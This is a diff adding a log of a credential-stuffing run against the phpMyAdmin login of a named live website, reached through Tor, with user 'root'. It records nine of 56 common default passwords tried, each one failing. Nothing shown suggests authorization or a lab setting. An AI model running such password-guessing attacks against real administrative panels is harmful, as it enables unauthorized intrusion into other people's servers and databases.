@@ -1,0 +1,11 @@
+[*] phpMyAdmin cred stuffing — user=root — 56 passwords
+[*] Target: https://186.226.60.54/phpMyAdmin/ (Host: desapegogames.com.br) via Tor SOCKS5
+  [01] pw=''                             → HTTP 200 loc='' len=18546 err=True fail
+  [02] pw='root'                         → HTTP 200 loc='' len=18546 err=True fail
+  [03] pw='password'                     → HTTP 200 loc='' len=18546 err=True fail
+  [04] pw='mysql'                        → HTTP 200 loc='' len=18546 err=True fail
+  [05] pw='toor'                         → HTTP 200 loc='' len=18546 err=True fail
+  [06] pw='123456'                       → HTTP 200 loc='' len=18546 err=True fail
+  [07] pw='admin'                        → HTTP 200 loc='' len=18546 err=True fail
+  [08] pw='root123'                      → HTTP 200 loc='' len=18546 err=True fail
+  [09] pw='12345678'                     → HTTP 200 loc='' len=18546 err=True fail
